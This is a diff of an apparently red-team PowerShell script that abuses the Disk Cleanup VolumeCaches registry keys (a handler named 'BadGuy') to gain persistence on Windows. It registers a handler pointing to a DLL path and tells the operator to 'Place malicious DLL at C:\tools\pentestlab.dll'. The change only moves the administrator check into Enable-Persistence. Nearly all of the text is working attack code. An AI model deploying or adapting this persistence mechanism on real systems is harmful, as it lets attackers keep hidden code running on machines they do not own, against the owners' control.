@@ -8,13 +8,8 @@ function Add-DiskCleanupHKLM {
 
 #>
     #check admin rights
-    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-    $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-
-    if ($isAdmin -eq $false) {
-        Write-Output "Administrator permissions needed to continue" 
-    }
-    else { $guid='{4f53c83a-900f-4ed9-902b-7a59a67747ed}'
+   
+    $guid='{4f53c83a-900f-4ed9-902b-7a59a67747ed}'
 
     New-Item -Name BadGuy -Value $guid -path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\
     New-ItemProperty -name 'CleanupString' -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\badguy' -value 'C:\Windows\System32\mspaint.exe'
@@ -23,7 +18,7 @@ function Add-DiskCleanupHKLM {
     New-ItemProperty -name 'Folder' -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\badguy' -value 'C:\test'
     #New-ItemProperty -name 'Flags' -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\badguy' -value 1 -PropertyType DWORD
     #New-ItemProperty -name 'StateFlags' -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\badguy' -value 1 -PropertyType DWORD
-    }
+    
 
 }
 
@@ -65,8 +60,20 @@ function Configure-Persistence {
 }
 
 function Enable-Persistence {
+   
+     $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+    $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+    if ($isAdmin -eq $false) {
+        Add-Type -AssemblyName System.Windows.Forms
+        Write-Output "Administrator permissions needed to continue" 
+        [System.Windows.Forms.Messagebox]::Show("Not running as administrator!")
+    }
+    else {
     Add-DiskCleanupHKCU -pathToDLL "C:\tools\pentestlab.dll"
     Add-DiskCleanupHKLM
     Configure-Persistence
     Write-Host 'Place malicious DLL at C:\tools\pentestlab.dll'
+    }
 }
+
